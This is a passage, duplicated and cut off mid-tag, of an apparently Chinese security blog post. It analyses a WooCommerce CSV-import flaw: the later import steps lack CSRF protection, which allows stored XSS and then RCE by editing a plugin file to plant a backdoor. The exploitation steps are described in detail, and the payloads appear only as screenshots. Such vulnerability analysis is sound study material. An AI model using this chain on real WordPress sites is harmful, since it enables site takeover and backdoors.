);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>否则，执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func( <span class=\"keyword\">$this</span>-&gt;steps[ <span class=\"keyword\">$this</span>-&gt;step ][<span class=\"string\">&#x27;view&#x27;</span>], <span class=\"keyword\">$this</span> );</span><br></pre></td></tr></table></figure>\n\n\n\n<p>反观四个上文四个步骤的请求，满足$_POST[‘save_step’]存在的，只有第一步upload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTE0U.png\" alt=\"KiTE0U.png\"></p>\n<p>Upload请求发起时，执行</p>\n<p>call_user_func( $this-&gt;steps[ $this-&gt;step ][‘handler’], $this );</p>\n<p>我们在数组中查找$this-&gt;steps[ $this-&gt;step ][‘handler’]的值，看看此时要执行什么方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTek4.png\" alt=\"KiTek4.png\"></p>\n<p>从上图可见，此时的$this-&gt;steps[ $this-&gt;step ][‘handler’]的值是upload_form_handler，upload_form_handler方法将被执行</p>\n<p>跟入upload_form_handler方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTmtJ.png\" alt=\"KiTmtJ.png\"></p>\n<p>可见上图288行存在check_admin_referer方法</p>\n<p>跟入check_admin_referer方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTnh9.png\" alt=\"KiTnh9.png\"></p>\n<p>如上图，此时1101行需要检验$REQUEST[$query_arg]的值，该值即为请求中的_wpnonce值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTKpR.png\" alt=\"KiTKpR.png\"></p>\n<p>这个nonce值是生成在页面中的，我们没法获取。可见，有了这个nonce的限制，在upload即上传文件的这一步，我们没法采用csrf攻击</p>\n<p>但是除此之外的其他步骤，并不会触发这个方法，其他步骤执行的都是</p>\n<p>call_user_func( $this-&gt;steps[ $this-&gt;step ][‘view’], $this );</p>\n<p>$this-&gt;steps[ $this-&gt;step ][‘view’]中的方法，并没有检查nonce</p>\n<p>在WooCommerce插件的导入模块中，只在upload这一步，加入了nonce，进行了csrf防御。也就是说，其他步骤并没有对csrf进行防御</p>\n<p>既然我们没有办法进行csrf攻击，来上传恶意csv，那是否还有其他办法上传呢？</p>\n<p>其实，这个恶意的csv并不需要管理员来上传，拥有作者权限的用户，可以自行上传csv文件到wordpress目录</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTM11.png\" alt=\"KiTM11.png\"></p>\n<p>直接在媒体里上传就行了</p>\n<p>但是这个csv，是需要管理员权限，才能导入到woocommerce的产品中</p>\n<h2 id=\"漏洞利用思路\"><a href=\"#漏洞利用思路\" class=\"headerlink\" title=\"漏洞利用思路\"></a>漏洞利用思路</h2><p>通过上文我们对导入功能代码的分析可以发现，该插件对csv文件的上传(upload)步骤，做了csrf防护，但是随后三个步骤，并没有进行csrf防护。虽然我们没法对上传步骤发起csrf攻击，但是我们可以绕过上传步骤，直接攻击后续步骤</p>\n<p>Wordpress对作者权限的用户，开放上传媒体文件的权限，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTQ6x.png\" alt=\"KiTQ6x.png\"></p>\n<p>我们可以利用这个功能，替换有csrf保护的upload步骤</p>\n<p>此时的思路是：</p>\n<p>1、 使用有作者权限的用户在媒体库上传一个恶意的csv文件</p>\n<p>2、 构造csrf，诱骗管理员执行发起导入产品请求，将我们上传的csv导入woocommerce的产品中</p>\n<p>3、导入成功，产品中被插入xss</p>\n<p>4、管理员访问产品页面，xss执行</p>\n<p>接下来验证我们的思路</p>\n<h3 id=\"上传一个恶意的csv文件\"><a href=\"#上传一个恶意的csv文件\" class=\"headerlink\" title=\"上传一个恶意的csv文件\"></a>上传一个恶意的csv文件</h3><p>首先，我们构造了一个csv</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTlX6.png\" alt=\"KiTlX6.png\"></p>\n<p>接着，我们用作者权限的用户上传媒体库</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiT3nK.png\" alt=\"KiT3nK.png\"></p>\n<p>最后，记录上传好的地址</p>\n<p>wp-content/uploads/2019/10/products-6.csv</p>\n<p>上传部分完成</p>\n<h3 id=\"构造csrf诱使管理员导入\"><a href=\"#构造csrf诱使管理员导入\" class=\"headerlink\" title=\"构造csrf诱使管理员导入\"></a>构造csrf诱使管理员导入</h3><p>我们先来看下正常情况下，导入csv的过程的请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiT80O.png\" alt=\"KiT80O.png\"></p>\n<p>Head</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTG7D.png\" alt=\"KiTG7D.png\"></p>\n<p>Body</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTYAe.png\" alt=\"KiTYAe.png\"></p>\n<p>可以发现，在body中存在一个security参数</p>\n<p>在后台程序校验上传请求是否合法时，会对post body中该参数进行校验，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTttH.png\" alt=\"KiTttH.png\"></p>\n<p>问题又来了，虽然导入请求没有csrf token的保护，但是如果我们想直接构造一个上图的导入表单，通过来诱骗管理员访问并提交如上请求来导入恶意csv，就需要知道这个security参数值。</p>\n<p>这个security参数是如何生成的？我们是否可以伪造这个参数？或者，既然这是一个ajax请求，我们能否绕开这个security?</p>\n<h4 id=\"security参数值分析\"><a href=\"#security参数值分析\" class=\"headerlink\" title=\"security参数值分析\"></a>security参数值分析</h4><p>这个参数是由上一个step(mapping列映射)的请求生成的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTNhd.png\" alt=\"KiTNhd.png\"></p>\n<p>Head</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTa9A.png\" alt=\"KiTa9A.png\"></p>\n<p>Body</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTd1I.png\" alt=\"KiTd1I.png\"></p>\n<p>当这个请求执行后，在相应的body中，会包含我们所需要的security参数值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTwct.png\" alt=\"KiTwct.png\"></p>\n<p>注意看上图红框处的import_nonce值，与我们上文中的security参数值是一样的</p>\n<h4 id=\"Security算法分析\"><a href=\"#Security算法分析\" class=\"headerlink\" title=\"Security算法分析\"></a>Security算法分析</h4><p>跟踪后台代码，分析下这个import_nonce/Security值是如何计算出来的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiT0jP.png\" alt=\"KiT0jP.png\"></p>\n<p>Import_nonce的产生如上图所示，是通过wp_create_nonce方法计算而来</p>\n<p>跟入wp_create_nonce方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTDnf.png\" alt=\"KiTDnf.png\"></p>\n<p>可见最终计算Import_nonce值，需要使用$i，$action，$uid，$token四个变量</p>\n<p>变量$i由wp_nonce_tick方法生成，跟入wp_nonce_tick方法看一下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTrB8.png\" alt=\"KiTrB8.png\"></p>\n<p>可见这个是用来计算nonce失效时间的，上图中的$nonce_life默认都是86400,也就是一天的总秒数，而上图2053行最终计算表达式不难看出，只要是半天内($nonce_life/2)生成的, wp_nonce_tick方法返回的这个值都应该是一样的。也就是说，Import_nonce值的生存期是半天(43200s)</p>\n<p>接下来几个参数就很简单了，$action是固定的’wc-product-import’，uid，token这些都是管理员的值</p>\n<h4 id=\"我们是否需要关心security参数值？\"><a href=\"#我们是否需要关心security参数值？\" class=\"headerlink\" title=\"我们是否需要关心security参数值？\"></a>我们是否需要关心security参数值？</h4><p>但事实上，我们并不需要关心这个security参数值，甚至根本不用去构造import这一步的请求。</p>\n<p>在Import这个步骤中，向后台发送的是ajax请求，这个请求并不是用户点击发送表单完成的，而是mapping步骤完成后，连带一同发起的。我们只需构造与发送mapping步骤的请求，程序将通过ajax自动完成后续import 以及Done步骤，因此，我们根本不需要关心Import步骤中的security值。</p>\n<p>详细分析如下：</p>\n<p>仍然看mapping列映射这一步的请求的后台代码，仍然分析下图这块代码 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTsHS.png\" alt=\"KiTsHS.png\"></p>\n<p>上文我们分析了这块代码的432行，也就是security值是如何计算出来的，但却没有介绍这块代码的实际作用</p>\n<p>这里<code>wp_localize_script()</code>使用JavaScript变量的数据对注册的脚本进行本地化操作，接着在442行处使用wp_enqueue_script将JS脚本添加到WordPress程序生成的页面当中。如上图，<code>wc_product_import_params</code>变量中的所有数据都由攻击者控制，例如其中重要的file路径。</p>\n<p>mapping列映射这个请求完成后的生成页面，将使用AJAX请求将攻击者控制的<code>$_POST</code>变量和有效的随机数一起发送到WordPress后端，完成导入步骤。</p>\n<p>也就是说，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，在mapping列映射完成后的返回页面中，存在发起import步骤的js代码，当页面被浏览器加载时，使用AJAX请求将攻击者控制的<code>$_POST</code>变量和有效的随机数一起发送到WordPress后端，完成后续的导入步骤。</p>\n<h3 id=\"导入成功以及XSS触发\"><a href=\"#导入成功以及XSS触发\" class=\"headerlink\" title=\"导入成功以及XSS触发\"></a>导入成功以及XSS触发</h3><p>将构造好的mapping步骤表单链接诱使管理员点击，恶意csv被会被导入，此时查看产品列表，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiT6Ag.png\" alt=\"KiT6Ag.png\"></p>\n<p>这条恶意的产品信息已经存在于产品列表中</p>\n<p>当打开产品页面时，其中的脚本就会被执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTcNQ.png\" alt=\"KiTcNQ.png\"></p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>根据上文我们分析，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，即可完成mapping列映射以及导入步骤。</p>\n<p>最终payload如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTghj.png\" alt=\"KiTghj.png\"></p>\n<p>这里的&amp;file=../wp-content/uploads/2019/10/products-6.csv为之前步骤中，上传的恶意csv的路径，需要根据实际情况构造</p>\n<p>Payload中form的两个input，map_from与map_to，是mapping列映射步骤后台必须存在的参数，参见下图代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTR9s.png\" alt=\"KiTR9s.png\"></p>\n<p>需要注意的是，我们构造的js语句插入在csv中哪个字段，这里的map_from map_to就要写对应的字段名称，否则导入时会出错</p>\n<p>管理员访问该payload，csrf漏洞将会被触发。表单被提交后，首先完成mapping步骤，接着，程序通过ajax自动发送import以及done步骤的请求，完成后续步骤。稍加等待，我们恶意的产品数据将会被导入，当管理员访问产品页面时，插入的js脚本将会被执行</p>\n<h1 id=\"XSS-to-RCE\"><a href=\"#XSS-to-RCE\" class=\"headerlink\" title=\"XSS to RCE\"></a>XSS to RCE</h1><p>Wordpress中允许博客管理员编辑管理控制台中的主题和插件文件。通过滥用XSS漏洞，攻击者可以在远程服务器上执行任意PHP代码。</p>\n<p>例如我们可以通过编辑插件功能，在后台写下payload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTW3n.png\" alt=\"KiTW3n.png\"></p>\n<p>编辑插件页面如上图</p>\n<p>我们构造恶意csv如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTfcq.png\" alt=\"KiTfcq.png\"></p>\n<p>构造csrf表单如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiThj0.png\" alt=\"KiThj0.png\"></p>\n<p>当管路员访问我们的csrf表单，恶意的csv将会被导入</p>\n<p>当管理员访问该产品页面时，插入产品描述内容中的js脚本将会被执行，akismet.php中的内容将会被修改，从而达到的插入后门的作用，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiT5uV.png\" alt=\"KiT5uV.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>WooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。</p>\n<p>WooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码</p>","more":"<h1 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h1><p>WooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。</p>\n<p>WooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码</p>\n<p>漏洞成因简单来说，是因为WooCommerce存在csv文件导入功能，该功能可以将csv中内容导入到产品列表中</p>\n<p>导入时共分四步(上传、列映射、导入以及done)，这四个步骤的请求是独立的，可以单独发送对应的请求，在后台完成相应的功能。</p>\n<p>WooCommerce只在第一步(上传csv文件)的时候验证了csrf token，而后续步骤并没有进行csrf防护。由于一定权限的wordpress用户可以直接在wordpress媒体库中上传csv文件，这将替代了有csrf防护的第一步，进而通过CSRF漏洞衔接后三步，导致了本次漏洞的产生。</p>\n<p>在这篇文章中，我将会为大家分析WooCommerce插件后台代码，分析本次漏洞成因，并还原本次漏洞利用，介绍POC的构造以及一些wordpress机制。</p>\n<h2 id=\"WooCommerce导入功能介绍\"><a href=\"#WooCommerce导入功能介绍\" class=\"headerlink\" title=\"WooCommerce导入功能介绍\"></a>WooCommerce导入功能介绍</h2><p>WooCommerce可以通过csv文件导入产品</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiozkQ.png\" alt=\"KiozkQ.png\"></p>\n<p>导入之后如下图所示</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/Kioj0S.png\" alt=\"Kioj0S.png\"></p>\n<p>WooCommerce中的每个产品都有一个产品说明，商店经理可以在其中插入有限的HTML，即非常基本的HTML标签和属性，例如<code>&lt;a&gt;</code>与<code>href</code>属性结合的标签。</p>\n<p>导入过程分为四步：上传、列映射、导入以及done！</p>\n<p>每一步对应的request分别如下</p>\n<p>上传：</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiovTg.png\" alt=\"KiovTg.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTV7F.png\" alt=\"KiTV7F.png\"></p>\n<p>列映射</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KioXm8.png\" alt=\"KioXm8.png\"><img src=\"https://s2.ax1x.com/2019/10/16/KiTSYj.png\" alt=\"KiTSYj.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTpfs.png\" alt=\"KiTpfs.png\"></p>\n<p>导入</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTCpn.png\" alt=\"KiTCpn.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTPlq.png\" alt=\"KiTPlq.png\"></p>\n<p>值得一提的是，导入步骤以及后续Done步骤的请求，是第三步列映射(mapping)请求完成后，通过使用admin-ajax.php 实现wordpress的ajax请求来完成的。后续步骤并不需要用户操作。在列映射步骤中，点击运行导入器按钮后，用户只需等待导入完成即可，程序将通过ajax向后台自动发送该导入等请求。</p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"WooCommerce导入功能代码逻辑分析\"><a href=\"#WooCommerce导入功能代码逻辑分析\" class=\"headerlink\" title=\"WooCommerce导入功能代码逻辑分析\"></a>WooCommerce导入功能代码逻辑分析</h2><p>我们先来看下，WooCommerce导入功能是怎么运作的</p>\n<p>跟入后台代码，看看程序是如何处理导入的四个步骤的</p>\n<p>当每个步骤请求发起后，后台都会使用dispatch来处理</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTi60.png\" alt=\"KiTi60.png\"></p>\n<p>这里简单解释下，首先可见上图中call_user_func执行$this-&gt;steps中的值，$this-&gt;steps值如下图，是固定的</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTFXV.png\" alt=\"KiTFXV.png\"></p>\n<p>$this-&gt;steps对应了四步操作。</p>\n<p>当每一步操作请求发送到后台时，都会调用dispatch方法，从$this-&gt;step对应的‘upload’/’mapping’/’import’/’done’这些数组中寻找对应的方法执行，</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTAmT.png\" alt=\"KiTAmT.png\"></p>\n<p>如上图，当$_POST[‘save_step’]以及$this-&gt;steps[ $this-&gt;step ][‘handler’]非空的情况下，执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func( <span class=\"keyword\">$this</span>-&gt;steps[ <span class=\"keyword\">$this</span>-&gt;step ][<span class=\"string\">&#x27;handler&#x27;</span>], <span class=\"keyword\">$this</span> );</span><br></pre></td></tr></table></figure>\n\n\n\n<p>否则，执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func( <span class=\"keyword\">$this</span>-&gt;steps[ <span class=\"keyword\">$this</span>-&gt;step ][<span class=\"string\">&#x27;view&#x27;</span>], <span class=\"keyword\">$this</span> );</span><br></pre></td></tr></table></figure>\n\n\n\n<p>反观四个上文四个步骤的请求，满足$_POST[‘save_step’]存在的，只有第一步upload</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTE0U.png\" alt=\"KiTE0U.png\"></p>\n<p>Upload请求发起时，执行</p>\n<p>call_user_func( $this-&gt;steps[ $this-&gt;step ][‘handler’], $this );</p>\n<p>我们在数组中查找$this-&gt;steps[ $this-&gt;step ][‘handler’]的值，看看此时要执行什么方法，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTek4.png\" alt=\"KiTek4.png\"></p>\n<p>从上图可见，此时的$this-&gt;steps[ $this-&gt;step ][‘handler’]的值是upload_form_handler，upload_form_handler方法将被执行</p>\n<p>跟入upload_form_handler方法，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTmtJ.png\" alt=\"KiTmtJ.png\"></p>\n<p>可见上图288行存在check_admin_referer方法</p>\n<p>跟入check_admin_referer方法，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTnh9.png\" alt=\"KiTnh9.png\"></p>\n<p>如上图，此时1101行需要检验$REQUEST[$query_arg]的值，该值即为请求中的_wpnonce值</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTKpR.png\" alt=\"KiTKpR.png\"></p>\n<p>这个nonce值是生成在页面中的，我们没法获取。可见，有了这个nonce的限制，在upload即上传文件的这一步，我们没法采用csrf攻击</p>\n<p>但是除此之外的其他步骤，并不会触发这个方法，其他步骤执行的都是</p>\n<p>call_user_func( $this-&gt;steps[ $this-&gt;step ][‘view’], $this );</p>\n<p>$this-&gt;steps[ $this-&gt;step ][‘view’]中的方法，并没有检查nonce</p>\n<p>在WooCommerce插件的导入模块中，只在upload这一步，加入了nonce，进行了csrf防御。也就是说，其他步骤并没有对csrf进行防御</p>\n<p>既然我们没有办法进行csrf攻击，来上传恶意csv，那是否还有其他办法上传呢？</p>\n<p>其实，这个恶意的csv并不需要管理员来上传，拥有作者权限的用户，可以自行上传csv文件到wordpress目录</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTM11.png\" alt=\"KiTM11.png\"></p>\n<p>直接在媒体里上传就行了</p>\n<p>但是这个csv，是需要管理员权限，才能导入到woocommerce的产品中</p>\n<h2 id=\"漏洞利用思路\"><a href=\"#漏洞利用思路\" class=\"headerlink\" title=\"漏洞利用思路\"></a>漏洞利用思路</h2><p>通过上文我们对导入功能代码的分析可以发现，该插件对csv文件的上传(upload)步骤，做了csrf防护，但是随后三个步骤，并没有进行csrf防护。虽然我们没法对上传步骤发起csrf攻击，但是我们可以绕过上传步骤，直接攻击后续步骤</p>\n<p>Wordpress对作者权限的用户，开放上传媒体文件的权限，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTQ6x.png\" alt=\"KiTQ6x.png\"></p>\n<p>我们可以利用这个功能，替换有csrf保护的upload步骤</p>\n<p>此时的思路是：</p>\n<p>1、 使用有作者权限的用户在媒体库上传一个恶意的csv文件</p>\n<p>2、 构造csrf，诱骗管理员执行发起导入产品请求，将我们上传的csv导入woocommerce的产品中</p>\n<p>3、导入成功，产品中被插入xss</p>\n<p>4、管理员访问产品页面，xss执行</p>\n<p>接下来验证我们的思路</p>\n<h3 id=\"上传一个恶意的csv文件\"><a href=\"#上传一个恶意的csv文件\" class=\"headerlink\" title=\"上传一个恶意的csv文件\"></a>上传一个恶意的csv文件</h3><p>首先，我们构造了一个csv</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTlX6.png\" alt=\"KiTlX6.png\"></p>\n<p>接着，我们用作者权限的用户上传媒体库</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiT3nK.png\" alt=\"KiT3nK.png\"></p>\n<p>最后，记录上传好的地址</p>\n<p>wp-content/uploads/2019/10/products-6.csv</p>\n<p>上传部分完成</p>\n<h3 id=\"构造csrf诱使管理员导入\"><a href=\"#构造csrf诱使管理员导入\" class=\"headerlink\" title=\"构造csrf诱使管理员导入\"></a>构造csrf诱使管理员导入</h3><p>我们先来看下正常情况下，导入csv的过程的请求</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiT80O.png\" alt=\"KiT80O.png\"></p>\n<p>Head</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTG7D.png\" alt=\"KiTG7D.png\"></p>\n<p>Body</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTYAe.png\" alt=\"KiTYAe.png\"></p>\n<p>可以发现，在body中存在一个security参数</p>\n<p>在后台程序校验上传请求是否合法时，会对post body中该参数进行校验，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTttH.png\" alt=\"KiTttH.png\"></p>\n<p>问题又来了，虽然导入请求没有csrf token的保护，但是如果我们想直接构造一个上图的导入表单，通过来诱骗管理员访问并提交如上请求来导入恶意csv，就需要知道这个security参数值。</p>\n<p>这个security参数是如何生成的？我们是否可以伪造这个参数？或者，既然这是一个ajax请求，我们能否绕开这个security?</p>\n<h4 id=\"security参数值分析\"><a href=\"#security参数值分析\" class=\"headerlink\" title=\"security参数值分析\"></a>security参数值分析</h4><p>这个参数是由上一个step(mapping列映射)的请求生成的</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTNhd.png\" alt=\"KiTNhd.png\"></p>\n<p>Head</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTa9A.png\" alt=\"KiTa9A.png\"></p>\n<p>Body</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTd1I.png\" alt=\"KiTd1I.png\"></p>\n<p>当这个请求执行后，在相应的body中，会包含我们所需要的security参数值</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTwct.png\" alt=\"KiTwct.png\"></p>\n<p>注意看上图红框处的import_nonce值，与我们上文中的security参数值是一样的</p>\n<h4 id=\"Security算法分析\"><a href=\"#Security算法分析\" class=\"headerlink\" title=\"Security算法分析\"></a>Security算法分析</h4><p>跟踪后台代码，分析下这个import_nonce/Security值是如何计算出来的</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiT0jP.png\" alt=\"KiT0jP.png\"></p>\n<p>Import_nonce的产生如上图所示，是通过wp_create_nonce方法计算而来</p>\n<p>跟入wp_create_nonce方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTDnf.png\" alt=\"KiTDnf.png\"></p>\n<p>可见最终计算Import_nonce值，需要使用$i，$action，$uid，$token四个变量</p>\n<p>变量$i由wp_nonce_tick方法生成，跟入wp_nonce_tick方法看一下</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTrB8.png\" alt=\"KiTrB8.png\"></p>\n<p>可见这个是用来计算nonce失效时间的，上图中的$nonce_life默认都是86400,也就是一天的总秒数，而上图2053行最终计算表达式不难看出，只要是半天内($nonce_life/2)生成的, wp_nonce_tick方法返回的这个值都应该是一样的。也就是说，Import_nonce值的生存期是半天(43200s)</p>\n<p>接下来几个参数就很简单了，$action是固定的’wc-product-import’，uid，token这些都是管理员的值</p>\n<h4 id=\"我们是否需要关心security参数值？\"><a href=\"#我们是否需要关心security参数值？\" class=\"headerlink\" title=\"我们是否需要关心security参数值？\"></a>我们是否需要关心security参数值？</h4><p>但事实上，我们并不需要关心这个security参数值，甚至根本不用去构造import这一步的请求。</p>\n<p>在Import这个步骤中，向后台发送的是ajax请求，这个请求并不是用户点击发送表单完成的，而是mapping步骤完成后，连带一同发起的。我们只需构造与发送mapping步骤的请求，程序将通过ajax自动完成后续import 以及Done步骤，因此，我们根本不需要关心Import步骤中的security值。</p>\n<p>详细分析如下：</p>\n<p>仍然看mapping列映射这一步的请求的后台代码，仍然分析下图这块代码 </p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTsHS.png\" alt=\"KiTsHS.png\"></p>\n<p>上文我们分析了这块代码的432行，也就是security值是如何计算出来的，但却没有介绍这块代码的实际作用</p>\n<p>这里<code>wp_localize_script()</code>使用JavaScript变量的数据对注册的脚本进行本地化操作，接着在442行处使用wp_enqueue_script将JS脚本添加到WordPress程序生成的页面当中。如上图，<code>wc_product_import_params</code>变量中的所有数据都由攻击者控制，例如其中重要的file路径。</p>\n<p>mapping列映射这个请求完成后的生成页面，将使用AJAX请求将攻击者控制的<code>$_POST</code>变量和有效的随机数一起发送到WordPress后端，完成导入步骤。</p>\n<p>也就是说，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，在mapping列映射完成后的返回页面中，存在发起import步骤的js代码，当页面被浏览器加载时，使用AJAX请求将攻击者控制的<code>$_POST</code>变量和有效的随机数一起发送到WordPress后端，完成后续的导入步骤。</p>\n<h3 id=\"导入成功以及XSS触发\"><a href=\"#导入成功以及XSS触发\" class=\"headerlink\" title=\"导入成功以及XSS触发\"></a>导入成功以及XSS触发</h3><p>将构造好的mapping步骤表单链接诱使管理员点击，恶意csv被会被导入，此时查看产品列表，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiT6Ag.png\" alt=\"KiT6Ag.png\"></p>\n<p>这条恶意的产品信息已经存在于产品列表中</p>\n<p>当打开产品页面时，其中的脚本就会被执行</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTcNQ.png\" alt=\"KiTcNQ.png\"></p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>根据上文我们分析，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，即可完成mapping列映射以及导入步骤。</p>\n<p>最终payload如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTghj.png\" alt=\"KiTghj.png\"></p>\n<p>这里的&amp;file=../wp-content/uploads/2019/10/products-6.csv为之前步骤中，上传的恶意csv的路径，需要根据实际情况构造</p>\n<p>Payload中form的两个input，map_from与map_to，是mapping列映射步骤后台必须存在的参数，参见下图代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTR9s.png\" 